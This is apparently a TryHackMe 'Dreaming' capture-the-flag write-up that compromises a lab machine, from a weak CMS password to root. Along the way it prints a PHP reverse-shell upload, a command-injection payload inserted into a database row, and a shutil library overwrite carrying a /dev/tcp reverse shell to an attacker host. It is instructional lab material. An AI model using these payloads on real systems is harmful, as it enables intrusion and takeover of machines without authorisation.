# Dreaming Writeup
---

| Description | Difficulty | Room link                    |
|-------------|------------|------------------------------|
| Solve the riddle that dreams have woven. | Easy | [Dreaming Room](https://tryhackme.com/room/dreaming) |

---

### - Recon:

...We will stat with an nmap scna:

```bash
 s4cript> nmap -sV -O -p- $VMip

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

 ...We see here, only 2 ports open, let's check http.
---

### - Enumeration:

..I tried to visit http
![Apache Ubuntu Default Page](https://i.ibb.co/HPp3YK9/apache.png)

...Just the default apach2 page, nothing special there i checked source code, so the only thing left is file & directory fuzzing, let's do that :

```bash
 s4cript> dirb http://$VMip

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb  6 19:13:31 2024
URL_BASE: http://10.10.44.184/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.44.184/ ----
==> DIRECTORY: http://10.10.44.184/app/

```

...We got a hit with /app, let' see what's there :
![/app_directory](https://i.ibb.co/ZW687zG/app.png)

...We discover a hidden directory that contains a website CMS called Pluck.

...Interesting, let's click on that:
![dreaming_page](https://i.ibb.co/ngtgv1g/dreaming.png)

...So from what we clicked we know that this site runs pluck 4.7.13 which is a content management system (CMS), we see in the bottom admin, and when clicking that we get a login page :
![login_page](https://i.ibb.co/RchYjrR/login.png)

...Nice , we only need the password , but we don't have that , let's try some common passwords , after a short time, I obtained the correct password it's 'password':
![dashbord](https://i.ibb.co/yQbtX44/dashboard.png)

...And we're in, that's the administration dashboard, now let's search if this CMS version has any vulnerabilities, and we found one, it's vulnerable to File Upload Remote Code Execution :
![exploit](https://i.ibb.co/j6nGDRh/vuln.png)

...And we see the exploit from ExploitDB :
![exploitdb](https://i.ibb.co/7JQHd0H/exploit.png)

...After checking that python exploit, we find that it's uploading a .phar file (which is one of many other php extensions) that contains a web shell, since we know the way let's do that manually.

### Exploitation:

...So first we go to the uploading page, which we can find in the navbar 'manage files' :
![navber](https://i.ibb.co/X4yDcjv/navbar.png)

...So we get this page:
![upload](https://i.ibb.co/vQHqycv/upload.png)

...Grabbing a PHP reverse shell, then simply switching its extension from .php to phar.

```bash
This command to copy the reverse shell from /usr/share/webshells/php directory to where you stay
 s4cript> cp /usr/share/webshells/php/php-reverse-shell.php .
This is command to change name for the php-reverse-shell.php to shell.phar
 s4cript> mv php-reverse-shell.php rev_shell.phar
```

...Now we upload that file, after that we get this page :
...![uploaded_file](https://ibb.co/1nY7ZKC/uploaded.png)

...We start a listener, then we click on that lens icon, and the file gets called and we get a reverse shell :

```bash
 s4cript> nc -lnvp 1234     
listening on [any] 1234 ...
connect to [10.18.114.37] from (UNKNOWN) [10.10.35.14] 32888
Linux dreaming 5.4.0-155-generic #172-Ubuntu SMP Fri Jul 7 16:10:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 11:02:04 up 8 min,  0 users,  load average: 0.08, 0.13, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

...i like to run this commands when i connected with non-interactive reverse shell , that it's optional But it's help me to dealing with machines after i get a non-interactive reverse shell

```bash
This command to elevate our Shell to interact shell(bash shell)
$ /bin/bash -i
Setting TERM(it's environment variable.) to xterm(it's is a terminal type, representing the X Terminal Emulator.) can help ensure proper display and functionality when running programs that rely on terminal capabilities
$export TERM=xterm
```

...We get foothold on the machine as www-data , Now it's time to find other users.

### Enumeration users:

...First we need to see all the users present on the machine by read the 'passwd' file:

```bash
$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
lucien:x:1000:1000:lucien:/home/lucien:/bin/bash
death:x:1001:1001::/home/death:/bin/bash
morpheus:x:1002:1002::/home/morpheus:/bin/bash
$ 
```

...So we have 3 users: lucien & death & morpheus , okay:

### Lucien Flag

...After some enumeration we find intersteing files in /opt Directory:

```bash
www-data@dreaming:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  2 root   root   4096 Aug 15 12:45 .
drwxr-xr-x 20 root   root   4096 Jul 28  2023 ..
-rwxrw-r--  1 death  death  1574 Aug 15 12:45 getDreams.py
-rwxr-xr-x  1 lucien lucien  483 Aug  7  2023 test.py
www-data@dreaming:/opt$ 
```

...We checked those files , guess.. we find a password in test.py , that's very nice:

```bash
www-data@dreaming:/opt$ cat test.py
cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[REDACTED]"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
www-data@dreaming:/opt$   
```

...We notice the password includes Lucien's name, suggesting it might be his password. Let's attempt it on SSH.

```bash
 s4cript  ssh lucien@10.10.35.14             
The authenticity of host '10.10.35.14 (10.10.35.14)' can't be established.
ECDSA key fingerprint is SHA256:gMjL4wglnUn5eG3wk7ADsRgIBdk1yIodmURn9G4689w.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.35.14' (ECDSA) to the list of known hosts.
                                  {} {}
                            !  !  II II  !  !
                         !  I__I__II II__I__I  !
                         I_/|--|--|| ||--|--|\_I
        .-'"'-.       ! /|_/|  |  || ||  |  |\_|\ !       .-'"'-.
       /===    \      I//|  |  |  || ||  |  |  |\\I      /===    \
       \==     /   ! /|/ |  |  |  || ||  |  |  | \|\ !   \==     /
        \__  _/    I//|  |  |  |  || ||  |  |  |  |\\I    \__  _/
         _} {_  ! /|/ |  |  |  |  || ||  |  |  |  | \|\ !  _} {_
        {_____} I//|  |  |  |  |  || ||  |  |  |  |  |\\I {_____}
   !  !  |=  |=/|/ |  |  |  |  |  || ||  |  |  |  |  | \|\=|-  |  !  !
  _I__I__|=  ||/|  |  |  |  |  |  || ||  |  |  |  |  |  |\||   |__I__I_
  -|--|--|-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|   ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||   |--|--|-
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |  |  |
   |  |  |=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |  |  |
   |  |  |   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
  _|__|__|   || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||=  |__|__|_
  -|--|--|=  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||   |--|--|-
  _|__|__|   ||_|__|__|__|__|__|__|| ||__|__|__|__|__|__|_||-  |__|__|_
  -|--|--|=  ||-|--|--|--|--|--|--|| ||--|--|--|--|--|--|-||=  |--|--|-
  jgs |  |-  || |  |  |  |  |  |  || ||  |  |  |  |  |  | ||-  |  |  |
 ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

W e l c o m e, s t r a n g e r . . .
lucien@10.10.35.14's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Feb 2024 11:29:50 AM UTC

  System load:  0.08               Processes:             138
  Usage of /:   55.0% of 11.21GB   Users logged in:       0
  Memory usage: 64%                IPv4 address for ens5: 10.10.35.14
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***
Last login: Mon Aug  7 23:34:46 2023 from 192.168.1.102
lucien@dreaming:~$ 
```

...And we are lucien now , cool.
...let's run ls command

```bash
lucien@dreaming:~$ ls
lucien_flag.txt
lucien@dreaming:~$ cat lucien_flag.txt
THM{REDACTED}
lucien@dreaming:~$
```

...yah , we find the first flag now

### Death Flag

...let's run sudo -l command now:

```bash
lucien@dreaming:~$ sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
lucien@dreaming:~$ 
```

...It appears we have the ability to execute /usr/bin/python3 /home/death/getDreams.py as the user 'death'.
...It's time to execute 'ls -l' command on this file and specify what permissions we have on this file.

```bash
lucien@dreaming:~$ ls -l /home/death/getDreams.py 
-rwxrwx--x 1 death death 1539 Aug 25 16:15 /home/death/getDreams.py
lucien@dreaming:~$ 
```

...We see here , we have just execute permission , so we can't read it or write on this file
...So , then i remembered seeing this file name before, that was in the /opt directory, let's read that file (assuming this script is a copy of that one in death's home directory) :

```bash
lucien@dreaming:/opt$ cat getDreams.py 
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
lucien@dreaming:/opt$ 
```

...This script establishes a connection to the MySQL database, targeting the library DB. It proceeds to fetch the 'dreamer' and 'dream' columns from the 'dreams' table, then outputs them using the echo command.
...Let's focus on command variable:

```bash
command = f"echo {dreamer} + {dream}"
```

...If we can manipulate the value of either of these variables, we can achieve command execution through command substitution. This technique replaces the command itself with the output of another command enclosed within $(), enabling Bash to execute the command and substitute its standard output accordingly.

...Feel free to experiment with this approach on the target machine to gain a deeper understanding of its functionality.

```bash
lucien@dreaming:/opt$ echo "$(whoami)"
lucien
```

...We observe the successful execution of the whoami command, illustrating the identical concept we aim to employ to attain command execution as the user 'death'.
...The sole hurdle we encounter lies in obtaining the credentials for the database, which we currently lack. However, through meticulous enumeration, we may uncover them within Lucien's bash history file.

```bash
lucien@dreaming:~$ cat $HOME/.bash_history
...
mysql -u lucien -p[REDACTED]
...
```

...With the acquired credentials, let's proceed to log in to the database and navigate to the 'dreams' table.

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.08 sec)

mysql> use library;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)
```

...Next, we'll append another entry ('s4cript') into the table, leveraging a reverse shell within command substitution to execute arbitrary commands.

```bash
INSERT INTO dreams (dreamer, dream) VALUES ('s4cript', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attacker_ip $attacker_port >/tmp/f)');
Query OK, 1 row affected (0.01 sec)
```

...Now, we establish a listener and execute the Python file, triggering the execution of the reverse shell.

```bash
s4cript> nc -lnvp $attacker_port
listening on [any] $attacker_port ...

Then exeute th ePython file

lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
```bash
s4cript> nc -lnvp $attacker_port
listening on [any] $attacker_port ...
connect to [attacker_ip] from (UNKNOWN) [VMip] 47202
```

...We've successfully obtained a shell as the user 'death', leaving only one user remaining: Morpheus.

## - Privilege Escalation

### Morpheus Flag

...As part of my standard enumeration process, I typically examine which files or directories the compromised user has write permissions for, a task accomplished using the find command:

```bash
death@dreaming:~$ find / ! -path "/proc/*" ! -path "/sys/*" ! -path "/home/death/*" -type f -writable 2>/dev/null
...
/var/www/html/app/pluck-4.7.13/data/trash/files/shell.phar
/var/www/html/app/pluck-4.7.13/data/trash/files/shell.php.txt
/usr/lib/python3.8/fnmatch.py
/usr/lib/python3.8/shutil.py
/opt/getDreams.py
```

...Interesting discovery. We have write permissions to two Python libraries: shutil and fnmatch. While we haven't identified a method to exploit this yet, let's continue our enumeration efforts.
...I've opted to run pspy64 to monitor live running processes, and one particular process has piqued my interest:

```bash
CMD: UID=1002  PID=5981   | /usr/bin/python3.8 /home/morpheus/restore.py
```

...The user with the UID 1002 (identified as Morpheus) is executing a Python file located at /home/morpheus/restore.py. Let's attempt to read its contents:

```bash
death@dreaming:~$ cat /home/morpheus/restore.py

from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

...Remarkable! The Python script employs the shutil library, and as we're aware, we have write access to this library. Let's inject some malicious Python code into the library. When the script is executed and imports this library, it will trigger the execution of our Python code.

...Let's proceed to overwrite the library with a Python reverse shell:

```bash
death@dreaming:~$ echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'\")" > /usr/lib/python3.8/shutil.py
```

...Following the overwrite, we establish a listener and patiently wait. Eventually, our diligence pays off as we receive a connection:

```bash
s4cript> nc -lvnp $attacker_port
listening on [any] $attacker_port ...
connect to [$attacker_ip] from (UNKNOWN) [$VMip] 48754
morpheus@dreaming:~$ id
id
uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
```

...We've successfully obtained a shell as Morpheus. Now, let's execute 'sudo -l' to determine the user's sudo privileges:

```bash
morpheus@dreaming:~$ sudo -l
Matching Defaults entries for morpheus on dreaming:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User morpheus may run the following commands on dreaming:
    (ALL) NOPASSWD: ALL
```

...With the ability to execute any command as any user, let's elevate privileges to root:

```bash
morpheus@dreaming:~$ sudo su
root@dreaming:/home/morpheus# whoami
root
root@dreaming:/home/morpheus# id
uid=0(root) gid=0(root) groups=0(root)
```

...Success! We now have a root shell.

#### Follow me on

...[My Linkedin.](https://www.linkedin.com/in/fahad-khalid-al-obaidallah/)
...[My Twitter.](https://twitter.com/s4cript)

...see you :)
